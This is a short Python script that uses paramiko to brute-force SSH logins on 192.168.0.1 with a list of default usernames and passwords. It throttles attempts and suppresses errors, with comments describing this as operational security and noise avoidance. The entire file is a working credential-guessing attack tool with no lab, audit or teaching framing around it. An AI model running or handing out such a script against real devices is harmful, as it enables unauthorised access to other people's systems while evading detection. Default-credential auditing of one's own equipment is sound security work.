import paramiko
import time
import sys

TARGET = "192.168.0.1"
USERS = ["admin", "root"]
PASSWORDS = ["admin", "root", "password", "1234", "123456", ""]
DELAY = 3  # Seconds between attempts for OPSEC

def test_ssh(user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(TARGET, port=22, username=user, password=password, timeout=5, banner_timeout=5, look_for_keys=False, allow_agent=False)
        print(f"[+] SSH SUCCESS: {user}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        # Silently fail on other errors to avoid noise
        return False
    finally:
        client.close()

print("[*] Starting slow SSH credential testing...")
for user in USERS:
    for pwd in PASSWORDS:
        print(f"[*] Testing {user}:{pwd}...")
        if test_ssh(user, pwd):
            print(f"[!!!] Found valid SSH credentials: {user}:{pwd}")
            sys.exit(0)
        time.sleep(DELAY)

print("[-] No default SSH credentials found.")